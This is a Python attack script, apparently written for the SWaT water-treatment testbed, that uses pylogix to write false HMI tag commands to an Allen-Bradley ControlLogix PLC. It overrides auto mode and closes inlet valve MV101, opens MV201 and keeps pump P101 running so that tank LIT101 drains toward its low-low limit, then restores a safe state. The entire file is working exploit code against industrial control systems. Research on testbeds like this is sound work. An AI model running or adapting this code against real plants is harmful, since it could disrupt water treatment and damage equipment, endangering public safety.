#!/usr/bin/env python3
"""
phase1_inject.py  —  SWaT Phase 1: False Command Injection (HMI-based)
Target: Allen-Bradley ControlLogix PLC1 at 192.168.1.10

Attack sequence:
  1. PRE-DRAIN: Take P101 to manual ON, let LIT101 drain to target level (~300mm)
  2. ATTACK: Close MV101 (valve shut), P101 stays ON — tank actively drains to LL
  3. RESTORE: Reopen MV101, restore P101 to auto on exit

Usage:
  python3 phase1_inject.py --plc-ip 192.168.1.10 --duration 120
  python3 phase1_inject.py --plc-ip 192.168.1.10 --duration 120 --target-level 300
  python3 phase1_inject.py --plc-ip 192.168.1.10 --duration 120 --skip-drain
"""

import argparse, time, signal
from datetime import datetime
from pylogix import PLC

# Attack: close MV101 (stop inflow) + open MV201 (force outflow to P2)
# P101 stays ON — triple drain: pump + MV201 both pulling from tank
ATTACK_CMDS = [
    ('HMI_MV101.Auto', False),   # take MV101 out of auto
    ('HMI_MV101.Cmd',  1),       # CLOSE inlet valve — stop inflow
    ('HMI_MV201.Auto', False),   # take MV201 out of auto (PLC2)
    ('HMI_MV201.Cmd',  2),       # OPEN MV201 — force outflow to P2
    # P101 intentionally left ON — tank drains via pump + MV201 simultaneously
]

# Safe state restore
SAFE_CMDS = [
    ('HMI_MV101.Auto', False),
    ('HMI_MV101.Cmd',  2),       # OPEN MV101
    ('HMI_MV101.Auto', True),    # restore auto
    ('HMI_MV201.Auto', False),
    ('HMI_MV201.Cmd',  1),       # CLOSE MV201 back
    ('HMI_MV201.Auto', True),    # restore auto
    ('HMI_P101.Auto',  False),
    ('HMI_P101.Cmd',   2),       # ensure pump ON
    ('HMI_P101.Auto',  True),    # restore auto
]

stop_flag = False


def ts():
    return datetime.now().strftime('%H:%M:%S')


def pre_drain(plc, target_level=300.0, poll=2.0):
    """
    Take P101 to manual ON and wait for LIT101 to drain to target_level.
    This gives the attack more headroom to show dramatic level drop.
    """
    print(f"\n[PRE-DRAIN] Taking P101 to manual ON — draining to {target_level}mm")
    print(f"[PRE-DRAIN] Press Ctrl+C at any time to abort\n")

    plc.Write('HMI_P101.Auto', False)
    plc.Write('HMI_P101.Cmd',  2)       # manual ON

    while not stop_flag:
        lit = plc.Read('HMI_LIT101.Pv').Value
        fit = plc.Read('AI_FIT_101_FLOW').Value
        mv  = plc.Read('HMI_MV101.Cmd').Value
        if lit is None:
            print(f"[{ts()}] LIT101 read failed — check connectivity")
            time.sleep(poll)
            continue

        bar = '█' * int(lit / 50) + '░' * (20 - int(lit / 50))
        print(f"[{ts()}] LIT101={lit:6.1f}mm {bar}  FIT101={fit:.3f}L/s  "
              f"MV101={'OPEN' if mv==2 else 'CLOSED'}", end='\r')

        if lit <= target_level + 10:
            print(f"\n[PRE-DRAIN] LIT101={lit:.1f}mm — near target {target_level}mm")
            print(f"[PRE-DRAIN] Pre-drain complete. Launching attack...\n")
            break

        time.sleep(poll)


def inject_loop(plc, duration, interval=1.0):
    print(f"[ATTACK] Injecting false commands for {duration}s")
    print(f"[ATTACK] MV101 → CLOSED   P101 stays ON → tank draining to LL\n")

    cycle    = 0
    end_time = time.time() + duration

    while not stop_flag and time.time() < end_time:
        errors = []
        for tag, val in ATTACK_CMDS:
            ret = plc.Write(tag, val)
            if ret.Status != 'Success':
                errors.append(f"{tag}: {ret.Status}")

        lit = plc.Read('HMI_LIT101.Pv').Value
        fit = plc.Read('AI_FIT_101_FLOW').Value
        mv  = plc.Read('HMI_MV101.Cmd').Value
        p1a = plc.Read('HMI_P101.Auto').Value

        cycle += 1
        remaining = max(0, int(end_time - time.time()))

        mv201 = plc.Read('HMI_MV201.Cmd').Value
        if errors:
            print(f"[{ts()}] cycle={cycle:4d}  ERRORS: {errors}")
        else:
            print(f"[{ts()}] cycle={cycle:4d}  "
                  f"MV101={'CLOSED' if mv==1 else 'OPEN '}  "
                  f"MV201={'OPEN' if mv201==2 else 'CLOSED'}  "
                  f"P101.Auto={p1a}  "
                  f"LIT101={lit:.1f}mm  "
                  f"FIT101={fit:.3f}L/s  "
                  f"[{remaining}s left]")
            # Safety warning if getting critically low
            if lit is not None and lit < 280:
                print(f"  *** WARNING: LIT101={lit:.1f}mm approaching LL (250mm) ***")

        time.sleep(interval)


def restore_plc(plc):
    print(f"\n[RESTORE] Restoring safe state...")
    for tag, val in SAFE_CMDS:
        ret = plc.Write(tag, val)
        print(f"    {tag:25s} = {val}  [{ret.Status}]")

    time.sleep(1)
    mv  = plc.Read('HMI_MV101.Cmd').Value
    p1a = plc.Read('HMI_P101.Auto').Value
    lit = plc.Read('HMI_LIT101.Pv').Value
    print(f"\n[RESTORE] Verified: MV101={'OPEN' if mv==2 else 'CLOSED'}  "
          f"P101.Auto={p1a}  LIT101={lit:.1f}mm")
    print("[RESTORE] Safe state restored.")


def signal_handler(sig, frame):
    global stop_flag
    print(f"\n[!] Ctrl+C — stopping...")
    stop_flag = True


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--plc-ip',       default='192.168.1.10')
    ap.add_argument('--duration',     type=int,   default=120)
    ap.add_argument('--interval',     type=float, default=1.0)
    ap.add_argument('--target-level', type=float, default=300.0,
                    help='Drain to this level (mm) before launching attack')
    ap.add_argument('--skip-drain',   action='store_true',
                    help='Skip pre-drain, attack immediately')
    args = ap.parse_args()

    signal.signal(signal.SIGINT, signal_handler)

    print("=" * 60)
    print("  SWaT Phase 1 — Direct CIP Tag Injection")
    print(f"  PLC: {args.plc_ip}   Duration: {args.duration}s")
    if not args.skip_drain:
        print(f"  Pre-drain to: {args.target_level}mm")
    print(f"  Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)

    with PLC() as plc:
        plc.IPAddress = args.plc_ip

        # Connectivity check
        test = plc.Read('HMI_LIT101.Pv')
        if test.Value is None:
            print(f"[!] Cannot reach PLC at {args.plc_ip}: {test.Status}")
            return
        print(f"[*] Connected. LIT101={test.Value:.1f}mm\n")

        # Step 1: Pre-drain (optional)
        if not args.skip_drain:
            pre_drain(plc, target_level=args.target_level)

        if stop_flag:
            print("[!] Aborted during pre-drain — restoring...")
            restore_plc(plc)
            return

        # Step 2: Attack
        inject_loop(plc, args.duration, args.interval)

        # Step 3: Restore
        restore_plc(plc)

    print("[+] Phase 1 complete.")


if __name__ == '__main__':
    main()
